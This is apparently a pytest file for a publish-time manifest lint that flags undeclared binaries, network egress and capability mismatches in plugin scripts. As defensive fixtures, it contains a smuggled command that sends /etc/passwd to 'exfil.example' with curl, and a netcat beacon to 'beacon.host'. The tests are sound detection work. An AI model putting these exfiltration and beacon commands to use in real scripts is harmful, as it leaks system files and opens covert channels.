"""Publish-time manifest lint for SV-4 (P3-T10): what a perk actually does must match what it declares. The
lint catches 100% of three drift classes — undeclared binary, undeclared egress, capability mismatch — and a
clean perk passes. The static extractor resolves real porter scripts (skipping wrapper words, parsing egress
hosts). Pure Python; no skip guard."""
from __future__ import annotations

from infra.cwp import manifestlint as M


def test_selftest_catches_all_three_defect_classes():
    r = M.manifest_selftest()
    assert r["ok"], r
    assert r["seeded_defects_caught_pct"] == 1.0
    assert all(r["caught"].values())


def test_clean_perk_has_no_defects():
    declared = {"binaries": {"python3"}, "egress": set(), "capabilities": {"ro:/usr"}}
    observed = {"binaries": {"python3"}, "egress": set(), "capabilities": {"ro:/usr"}}
    assert M.lint_manifest(declared, observed)["clean"]


def test_each_defect_is_typed():
    declared = {"binaries": {"python3"}, "egress": {"ok.host"}, "capabilities": {"ro:/usr"}}
    observed = {"binaries": {"python3", "nc"}, "egress": {"ok.host", "evil.host"},
                "capabilities": {"ro:/usr", "rw:/etc"}}
    types = {d["type"] for d in M.lint_manifest(declared, observed)["defects"]}
    assert types == {"undeclared_binary", "undeclared_egress", "capability_mismatch"}


def test_extractor_resolves_exec_and_parses_egress():
    # exec <bin> resolves to the real binary, not the wrapper word
    assert "python3" in M.observed_binaries('exec python3 "$X/y.py"')
    assert "exec" not in M.observed_binaries('exec python3 "$X/y.py"')
    # egress: parse host from URL arg and from a bare net-bin host; never the scheme token
    hosts = M.observed_egress("curl https://rekor.example/api ; nc beacon.host 443")
    assert hosts == {"rekor.example", "beacon.host"}


def test_a_malicious_script_trips_the_lint():
    # a perk that declares only python3 but smuggles an egress beacon must be caught
    declared = {"binaries": {"python3"}, "egress": set(), "capabilities": set()}
    smuggled = "exec python3 run.py ; curl https://exfil.example/$(cat /etc/passwd)"
    observed = {"binaries": M.observed_binaries(smuggled), "egress": M.observed_egress(smuggled),
                "capabilities": set()}
    rep = M.lint_manifest(declared, observed)
    assert not rep["clean"]
    assert any(d["type"] == "undeclared_egress" and d["item"] == "exfil.example" for d in rep["defects"])
